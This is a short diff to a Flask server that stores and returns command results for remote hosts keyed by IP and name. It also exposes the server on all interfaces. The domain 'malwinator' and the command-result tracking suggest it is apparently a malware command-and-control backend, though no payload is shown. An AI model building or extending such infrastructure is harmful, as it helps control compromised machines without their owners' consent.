@@ -162,9 +162,10 @@ def result():
 @app.route('/getResult', methods = ['POST'])
 def get_result():
   global hosts
-  
+  name = request.form['name']
+  ip = request.form['ip']
   # this is where the web browser will call for the command result
-  key = (request.remote_addr, request.form['name'])
+  key = (ip, name)
   return hosts[key]['command_result']
 
 
@@ -205,9 +206,9 @@ def upload():
 #   app.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='0.0.0.0', port='8082')
 
 # http server
-# if __name__ == "__main__":
-#   app.run(host='0.0.0.0', port='8081')
-
-# localhost server
 if __name__ == "__main__":
-  app.run(host='127.0.0.1', port='8088')
+  app.run(host='0.0.0.0', port='5000')
+
+# # localhost server
+# if __name__ == "__main__":
+#   app.run(host='127.0.0.1', port='8088')
